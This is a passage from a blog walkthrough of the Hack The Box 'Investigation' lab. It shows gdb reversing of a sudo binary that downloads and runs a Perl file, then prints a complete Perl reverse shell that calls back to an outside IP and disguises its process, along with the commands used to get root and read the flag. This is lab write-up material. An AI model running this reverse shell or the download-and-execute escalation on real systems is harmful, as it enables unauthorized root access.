+</span></span><span class=line><span class=cl>0x7fffffffe792:    &#34;foobarbaz&#34;
+</span></span></code></pre></td></tr></table></div></div><p>Above I set breakpoints at addresses <code>0x00005555555554f9</code>, <code>0x000055555555551a</code>, <code>0x000055555555553c</code>, and <code>0x0000555555555548</code>, then run the executable with <code>r foobarbaz lDnxUysaQn</code>, where <code>foobarbaz lDnxUysaQn</code> are two arguments passed in.</p><p>So, it looks like our first argument to the binary, <code>foobarbaz</code> is passed as third arg to function <code>curl_easy_setopt</code>, while <code>0xc0dedbad</code> (lol) is the handle and <code>0x2712</code> is the option:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>curl_easy_setopt(CURL *handle, CURLoption option, parameter);
+</span></span></code></pre></td></tr></table></div></div><p>Searching online, <code>0x2712</code> appears to be <code>CURLOPT_URL</code> - the option for setting the URL to retrieve!.. So with this in mind, let&rsquo;s re-run locally after deleting all breakpoints, and break on the <code>system</code> call that occurs after <code>curl_easy_perform</code> &ndash; after ensuring we are running a HTTP server with <code>python -m http.server 6969</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>(gdb) break *0x0000555555555657
+</span></span><span class=line><span class=cl>Breakpoint 10 at 0x555555555657
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>(gdb) r http://localhost:6969 lDnxUysaQn
+</span></span><span class=line><span class=cl>The program being debugged has been started already.
+</span></span><span class=line><span class=cl>Start it from the beginning? (y or n) y
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Starting program: /home/zara/investigation/binary http://localhost:6969 lDnxUysaQn
+</span></span><span class=line><span class=cl>[Thread debugging using libthread_db enabled]
+</span></span><span class=line><span class=cl>Using host libthread_db library &#34;/lib/x86_64-linux-gnu/libthread_db.so.1&#34;.
+</span></span><span class=line><span class=cl>Running... 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Breakpoint 10, 0x0000555555555657 in main ()
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>(gdb) x/s $rdi
+</span></span><span class=line><span class=cl>0x55555555ab30:    &#34;perl ./lDnxUysaQn&#34;
+</span></span></code></pre></td></tr></table></div></div><p>So, when we print the first argument (<code>RDI</code> register) to the <code>system</code> call as a string, it&rsquo;s a command to call the <code>perl</code> interpreter on the file we just downloaded.</p><p>What does this all mean (the eternal question)? Assuming we call our binary with <code>sudo /usr/bin/binary http://myurl:1234/file lDnxUysaQn</code> , it will use libcurl to download the URL, write it to file <code>lDnxUysaQn</code>, and run it against perl.</p><p>With all this in mind, we create the following reverse shell in perl locally (taken from pentest monkey):</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span><span class=lnt>69
+</span><span class=lnt>70
+</span><span class=lnt>71
+</span><span class=lnt>72
+</span><span class=lnt>73
+</span><span class=lnt>74
+</span><span class=lnt>75
+</span><span class=lnt>76
+</span><span class=lnt>77
+</span><span class=lnt>78
+</span><span class=lnt>79
+</span><span class=lnt>80
+</span><span class=lnt>81
+</span><span class=lnt>82
+</span><span class=lnt>83
+</span><span class=lnt>84
+</span><span class=lnt>85
+</span><span class=lnt>86
+</span><span class=lnt>87
+</span><span class=lnt>88
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-perl data-lang=perl><span class=line><span class=cl><span class=ch>#!/usr/bin/perl -w</span>
+</span></span><span class=line><span class=cl><span class=k>use</span> <span class=nn>strict</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=k>use</span> <span class=nn>Socket</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=k>use</span> <span class=nn>FileHandle</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=k>use</span> <span class=nn>POSIX</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=k>my</span> <span class=nv>$VERSION</span> <span class=o>=</span> <span class=s>&#34;1.0&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Where to send the reverse shell.  Change these.</span>
+</span></span><span class=line><span class=cl><span class=k>my</span> <span class=nv>$ip</span> <span class=o>=</span> <span class=s>&#39;10.10.14.33&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=k>my</span> <span class=nv>$port</span> <span class=o>=</span> <span class=mi>3322</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Options</span>
+</span></span><span class=line><span class=cl><span class=k>my</span> <span class=nv>$daemon</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=k>my</span> <span class=nv>$auth</span>   <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=c1># 0 means authentication is disabled and any </span>
+</span></span><span class=line><span class=cl>        <span class=c1># source IP can access the reverse shell</span>
+</span></span><span class=line><span class=cl><span class=k>my</span> <span class=nv>$authorised_client_pattern</span> <span class=o>=</span> <span class=sx>qr(^127\.0\.0\.1$)</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Declarations</span>
+</span></span><span class=line><span class=cl><span class=k>my</span> <span class=nv>$global_page</span> <span class=o>=</span> <span class=s>&#34;&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=k>my</span> <span class=nv>$fake_process_name</span> <span class=o>=</span> <span class=s>&#34;/usr/sbin/apache&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Change the process name to be less conspicious</span>
+</span></span><span class=line><span class=cl><span class=nv>$0</span> <span class=o>=</span> <span class=s>&#34;[httpd]&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Authenticate based on source IP address if required</span>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nb>defined</span><span class=p>(</span><span class=nv>$ENV</span><span class=p>{</span><span class=s>&#39;REMOTE_ADDR&#39;</span><span class=p>}))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=n>cgiprint</span><span class=p>(</span><span class=s>&#34;Browser IP address appears to be: $ENV{&#39;REMOTE_ADDR&#39;}&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nv>$auth</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>unless</span> <span class=p>(</span><span class=nv>$ENV</span><span class=p>{</span><span class=s>&#39;REMOTE_ADDR&#39;</span><span class=p>}</span> <span class=o>=~</span> <span class=nv>$authorised_client_pattern</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=n>cgiprint</span><span class=p>(</span><span class=s>&#34;ERROR: Your client isn&#39;t authorised to view this page&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>            <span class=n>cgiexit</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>elsif</span> <span class=p>(</span><span class=nv>$auth</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=n>cgiprint</span><span class=p>(</span><span class=s>&#34;ERROR: Authentication is enabled, but I couldn&#39;t determine your IP address.  Denying access&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>cgiexit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Background and dissociate from parent process if required</span>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nv>$daemon</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>my</span> <span class=nv>$pid</span> <span class=o>=</span> <span class=nb>fork</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nv>$pid</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=n>cgiexit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span> <span class=c1># parent exits</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>setsid</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>    <span class=nb>chdir</span><span class=p>(</span><span class=s>&#39;/&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nb>umask</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Make TCP connection for reverse shell</span>
+</span></span><span class=line><span class=cl><span class=nb>socket</span><span class=p>(</span><span class=n>SOCK</span><span class=p>,</span> <span class=n>PF_INET</span><span class=p>,</span> <span class=n>SOCK_STREAM</span><span class=p>,</span> <span class=nb>getprotobyname</span><span class=p>(</span><span class=s>&#39;tcp&#39;</span><span class=p>));</span>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nb>connect</span><span class=p>(</span><span class=n>SOCK</span><span class=p>,</span> <span class=n>sockaddr_in</span><span class=p>(</span><span class=nv>$port</span><span class=p>,</span><span class=n>inet_aton</span><span class=p>(</span><span class=nv>$ip</span><span class=p>))))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=n>cgiprint</span><span class=p>(</span><span class=s>&#34;Sent reverse shell to $ip:$port&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>cgiprintpage</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=n>cgiprint</span><span class=p>(</span><span class=s>&#34;Couldn&#39;t open reverse shell to $ip:$port: $!&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>cgiexit</span><span class=p>();</span>    
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Redirect STDIN, STDOUT and STDERR to the TCP connection</span>
+</span></span><span class=line><span class=cl><span class=nb>open</span><span class=p>(</span><span class=bp>STDIN</span><span class=p>,</span> <span class=s>&#34;&gt;&amp;SOCK&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nb>open</span><span class=p>(</span><span class=bp>STDOUT</span><span class=p>,</span><span class=s>&#34;&gt;&amp;SOCK&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nb>open</span><span class=p>(</span><span class=bp>STDERR</span><span class=p>,</span><span class=s>&#34;&gt;&amp;SOCK&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$ENV</span><span class=p>{</span><span class=s>&#39;HISTFILE&#39;</span><span class=p>}</span> <span class=o>=</span> <span class=s>&#39;/dev/null&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nb>system</span><span class=p>(</span><span class=s>&#34;w;uname -a;id;pwd&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nb>exec</span><span class=p>({</span><span class=s>&#34;bash&#34;</span><span class=p>}</span> <span class=p>(</span><span class=nv>$fake_process_name</span><span class=p>,</span> <span class=s>&#34;-i&#34;</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Wrapper around print</span>
+</span></span><span class=line><span class=cl><span class=k>sub</span> <span class=nf>cgiprint</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>my</span> <span class=nv>$line</span> <span class=o>=</span> <span class=nb>shift</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$line</span> <span class=o>.=</span> <span class=s>&#34;&lt;p&gt;\n&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$global_page</span> <span class=o>.=</span> <span class=nv>$line</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Wrapper around exit</span>
+</span></span><span class=line><span class=cl><span class=k>sub</span> <span class=nf>cgiexit</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=n>cgiprintpage</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>    <span class=nb>exit</span> <span class=mi>0</span><span class=p>;</span> <span class=c1># 0 to ensure we don&#39;t give a 500 response.</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Form HTTP response using all the messages gathered by cgiprint so far</span>
+</span></span><span class=line><span class=cl><span class=k>sub</span> <span class=nf>cgiprintpage</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>print</span> <span class=s>&#34;Content-Length: &#34;</span> <span class=o>.</span> <span class=nb>length</span><span class=p>(</span><span class=nv>$global_page</span><span class=p>)</span> <span class=o>.</span> <span class=s>&#34;\r
+</span></span></span><span class=line><span class=cl><span class=s>Connection: close\r
+</span></span></span><span class=line><span class=cl><span class=s>Content-Type: text\/html\r\n\r\n&#34;</span> <span class=o>.</span> <span class=nv>$global_page</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>We serve it up with <code>python -m http.server 8888</code>, and run netcat locally with <code>nc -lvnp 3322</code>. Then, on the target machine, we run:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>smorton@investigation:~$ sudo /usr/bin/binary http://10.10.14.33:8888 lDnxUysaQn
+</span></span><span class=line><span class=cl>Running... 
+</span></span><span class=line><span class=cl>Content-Length: <span class=m>0</span>
+</span></span><span class=line><span class=cl>Connection: close
+</span></span><span class=line><span class=cl>Content-Type: text/html
+</span></span></code></pre></td></tr></table></div></div><p>And, our reverse shell connects in, allowing us to read the root flag!:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nc -lvnp <span class=m>3322</span>
+</span></span><span class=line><span class=cl>Listening on 0.0.0.0 <span class=m>3322</span>
+</span></span><span class=line><span class=cl>Connection received on 10.10.11.197 <span class=m>35636</span>
+</span></span><span class=line><span class=cl> 08:36:19 up <span class=m>1</span> day,  3:02,  <span class=m>3</span> users,  load average: 0.00, 0.00, 0.00
+</span></span><span class=line><span class=cl>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+</span></span><span class=line><span class=cl>smorton  pts/1    10.10.14.54      04:26    3:50m  0.15s  0.15s -bash
+</span></span><span class=line><span class=cl>smorton  pts/2    10.10.14.33      08:35    1.00s  0.09s  0.09s -bash
+</span></span><span class=line><span class=cl>smorton  pts/0    10.10.14.33      05:46    1:51m  1.75s  1.63s python3 -m http.server <span class=m>8888</span>
+</span></span><span class=line><span class=cl>Linux investigation 5.4.0-137-generic <span class=c1>#154-Ubuntu SMP Thu Jan 5 17:03:22 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux</span>
+</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span>
+</span></span><span class=line><span class=cl>/
+</span></span><span class=line><span class=cl>apache: cannot <span class=nb>set</span> terminal process group <span class=o>(</span>-1<span class=o>)</span>: Inappropriate ioctl <span class=k>for</span> device
+</span></span><span class=line><span class=cl>apache: no job control in this shell
+</span></span><span class=line><span class=cl>root@investigation:~# cat root    
+</span></span><span class=line><span class=cl>cat root.txt 
+</span></span><span class=line><span class=cl>1ea4d12d7c9626e34f5031b7dd21d434
+</span></span></code></pre></td></tr></table></div></div><p>And we&rsquo;re done!</p><h2 id=conclusion>Conclusion</h2><p>An enjoyable machine combining a little forensics along with reverse engineering an ELF binary in order to understand and use its behaviour to privilege escalate to root. Finding the password incorrectly entered in the user field (resulting in a credential leak) took considerable time, as here I was searching for known usernames in the username field, and not <em>other</em> strings. Basically, I should have looked for the absence of known/meaningful usernames and instead looked for anomalies &ndash; this meant searching was a little laborious and very much finding a needle in a haystack. This was my first &lsquo;real&rsquo; attempt at forensics, and I&rsquo;m sure I have a lot to learn on the topic.</p><p>Reversing the binary was fun, if only to practice my skills at understanding how a C app compiles into assembly and subsequently machine code. When in the mood, I actually find assembly moderately easy to understand despite first appearances. I think if you understand a few instructions, and how a call stack is established, pointer references and a few basic concepts plus how they differ between 32-bit and 64-bit, the rest flows naturally and isn&rsquo;t too difficult to learn on the fly.</p><p>I&rsquo;ve been following <a href="https://www.youtube.com/watch?v=iyAyN3GFM7A&amp;list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN" target=_blank rel="noopener noreffer">LiveOverflow&rsquo;s BinaryExploitation series</a> and <a href=https://pwn.college/ target=_blank rel="noopener noreffer">pwn.college</a> (both highly recommended!) to prep myself for binary exploitation &ndash; and this helped quite a lot.</p><p>I&rsquo;m definitely looking forward to diving into more CTFs centered around reversing and binary exploitation very shortly.</p></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>Updated on 2023-04-22&nbsp;<a class=git-hash href=https://github.com/m-dwyer/emdwyer.github.io/commit/5b6b1b1047815c8bc9216a9e683d27263c915f5e target=_blank title="commit by m-dwyer(13535330+m-dwyer@users.noreply.github.com) 5b6b1b1047815c8bc9216a9e683d27263c915f5e: fix broken tags.. again">
+<i class="fas fa-hashtag fa-fw" aria-hidden=true></i>5b6b1b1</a></span></div></div><div class=post-info-line><div class=post-info-md><span><a class=link-to-markdown href=/2023-04-22-investigation-htb/index.md target=_blank>Read Markdown</a></span></div><div class=post-info-share><span><a href=javascript:void(0); title="Share on Linkedin" data-sharer=linkedin data-url=https://emdwyer.github.io/2023-04-22-investigation-htb/><i class="fab fa-linkedin fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Hacker News" data-sharer=hackernews data-url=https://emdwyer.github.io/2023-04-22-investigation-htb/ data-title="Investigation HTB Walkthrough"><i class="fab fa-hacker-news fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Line" data-sharer=line data-url=https://emdwyer.github.io/2023-04-22-investigation-htb/ data-title="Investigation HTB Walkthrough"><i data-svg-src=https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg aria-hidden=true></i></a><a href=javascript:void(0); title="Share on 微博" data-sharer=weibo data-url=https://emdwyer.github.io/2023-04-22-investigation-htb/ data-title="Investigation HTB Walkthrough"><i class="fab fa-weibo fa-fw" aria-hidden=true></i></a></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw" aria-hidden=true></i>&nbsp;<a href=/tags/htb/>htb</a>,&nbsp;<a href=/tags/security/>security</a>,&nbsp;<a href=/tags/penetration-testing/>penetration testing</a>,&nbsp;<a href=/tags/forensics/>forensics</a>,&nbsp;<a href=/tags/reversing/>reversing</a>,&nbsp;<a href=/tags/injection/>injection</a>,&nbsp;<a href=/tags/disassembly/>disassembly</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>Back</a></span>&nbsp;|&nbsp;<span><a href=/>Home</a></span></section></div><div class=post-nav><a href=/2023-04-15-encoding-htb/ class=prev rel=prev title="Encoding HTB Walkthrough"><i class="fas fa-angle-left fa-fw" aria-hidden=true></i>Encoding HTB Walkthrough</a></div></div><div id=comments><div id=valine class=comment></div><noscript>Please enable JavaScript to view the comments powered by <a href=https://valine.js.org/>Valine</a>.</noscript></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="far fa-copyright fa-fw" aria-hidden=true></i><span itemprop=copyrightYear>2022 - 2023</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank>emdwyer</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top"><i class="fas fa-arrow-up fa-fw" aria-hidden=true></i>
+</a><a href=# id=view-comments class=fixed-button title="View Comments"><i class="fas fa-comment fa-fw" aria-hidden=true></i></a></div><link rel=stylesheet href=/lib/valine/valine.min.css><script type=text/javascript src=https://cdn.jsdelivr.net/npm/valine@1.5.0/dist/Valine.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"Copy to clipboard",maxShownLines:50},comment:{valine:{appId:"QGzwQXOqs5JOhN4RGPOkR2mR-MdYXbMMI",appKey:"WBmoGyJtbqUswvfLh6L8iEBr",avatar:"mp",el:"#valine",emojiCDN:"https://cdn.jsdelivr.net/npm/emoji-datasource-google@14.0.0/img/google/64/",emojiMaps:{100:"1f4af.png",alien:"1f47d.png",anger:"1f4a2.png",angry:"1f620.png",anguished:"1f627.png",astonished:"1f632.png",black_heart:"1f5a4.png",blue_heart:"1f499.png",blush:"1f60a.png",bomb:"1f4a3.png",boom:"1f4a5.png",broken_heart:"1f494.png",brown_heart:"1f90e.png",clown_face:"1f921.png",cold_face:"1f976.png",cold_sweat:"1f630.png",confounded:"1f616.png",confused:"1f615.png",cry:"1f622.png",crying_cat_face:"1f63f.png",cupid:"1f498.png",dash:"1f4a8.png",disappointed:"1f61e.png",disappointed_relieved:"1f625.png",dizzy:"1f4ab.png",dizzy_face:"1f635.png",drooling_face:"1f924.png",exploding_head:"1f92f.png",expressionless:"1f611.png",face_vomiting:"1f92e.png",face_with_cowboy_hat:"1f920.png",face_with_hand_over_mouth:"1f92d.png",face_with_head_bandage:"1f915.png",face_with_monocle:"1f9d0.png",face_with_raised_eyebrow:"1f928.png",face_with_rolling_eyes:"1f644.png",face_with_symbols_on_mouth:"1f92c.png",face_with_thermometer:"1f912.png",fearful:"1f628.png",flushed:"1f633.png",frowning:"1f626.png",ghost:"1f47b.png",gift_heart:"1f49d.png",green_heart:"1f49a.png",grimacing:"1f62c.png",grin:"1f601.png",grinning:"1f600.png",hankey:"1f4a9.png",hear_no_evil:"1f649.png",heart:"2764-fe0f.png",heart_decoration:"1f49f.png",heart_eyes:"1f60d.png",heart_eyes_cat:"1f63b.png",heartbeat:"1f493.png",heartpulse:"1f497.png",heavy_heart_exclamation_mark_ornament:"2763-fe0f.png",hole:"1f573-fe0f.png",hot_face:"1f975.png",hugging_face:"1f917.png",hushed:"1f62f.png",imp:"1f47f.png",innocent:"1f607.png",japanese_goblin:"1f47a.png",japanese_ogre:"1f479.png",joy:"1f602.png",joy_cat:"1f639.png",kiss:"1f48b.png",kissing:"1f617.png",kissing_cat:"1f63d.png",kissing_closed_eyes:"1f61a.png",kissing_heart:"1f618.png",kissing_smiling_eyes:"1f619.png",laughing:"1f606.png",left_speech_bubble:"1f5e8-fe0f.png",love_letter:"1f48c.png",lying_face:"1f925.png",mask:"1f637.png",money_mouth_face:"1f911.png",nauseated_face:"1f922.png",nerd_face:"1f913.png",neutral_face:"1f610.png",no_mouth:"1f636.png",open_mouth:"1f62e.png",orange_heart:"1f9e1.png",partying_face:"1f973.png",pensive:"1f614.png",persevere:"1f623.png",pleading_face:"1f97a.png",pouting_cat:"1f63e.png",purple_heart:"1f49c.png",rage:"1f621.png",relaxed:"263a-fe0f.png",relieved:"1f60c.png",revolving_hearts:"1f49e.png",right_anger_bubble:"1f5ef-fe0f.png",robot_face:"1f916.png",rolling_on_the_floor_laughing:"1f923.png",scream:"1f631.png",scream_cat:"1f640.png",see_no_evil:"1f648.png",shushing_face:"1f92b.png",skull:"1f480.png",skull_and_crossbones:"2620-fe0f.png",sleeping:"1f634.png",sleepy:"1f62a.png",slightly_frowning_face:"1f641.png",slightly_smiling_face:"1f642.png",smile:"1f604.png",smile_cat:"1f638.png",smiley:"1f603.png",smiley_cat:"1f63a.png",smiling_face_with_3_hearts:"1f970.png",smiling_imp:"1f608.png",smirk:"1f60f.png",smirk_cat:"1f63c.png",sneezing_face:"1f927.png",sob:"1f62d.png",space_invader:"1f47e.png",sparkling_heart:"1f496.png",speak_no_evil:"1f64a.png",speech_balloon:"1f4ac.png","star-struck":"1f929.png",stuck_out_tongue:"1f61b.png",stuck_out_tongue_closed_eyes:"1f61d.png",stuck_out_tongue_winking_eye:"1f61c.png",sunglasses:"1f60e.png",sweat:"1f613.png",sweat_drops:"1f4a6.png",sweat_smile:"1f605.png",thinking_face:"1f914.png",thought_balloon:"1f4ad.png",tired_face:"1f62b.png",triumph:"1f624.png",two_hearts:"1f495.png",unamused:"1f612.png",upside_down_face:"1f643.png",weary:"1f629.png",white_frowning_face:"2639-fe0f.png",white_heart:"1f90d.png",wink:"1f609.png",woozy_face:"1f974.png",worried:"1f61f.png",yawning_face:"1f971.png",yellow_heart:"1f49b.png",yum:"1f60b.png",zany_face:"1f92a.png",zipper_mouth_face:"1f910.png",zzz:"1f4a4.png"},enableQQ:!1,highlight:!0,lang:"en",pageSize:10,placeholder:"Your comment ...",recordIP:!0,serverURLs:"https://leancloud.hugoloveit.com",visitor:!0}},search:{highlightTag:"em",lunrIndexURL:"/index.json",maxResultLength:10,noResultsFound:"No results found",snippetLength:30,type:"lunr"}}</script><script type=text/javascript src=/js/theme.min.js></script></body></html>
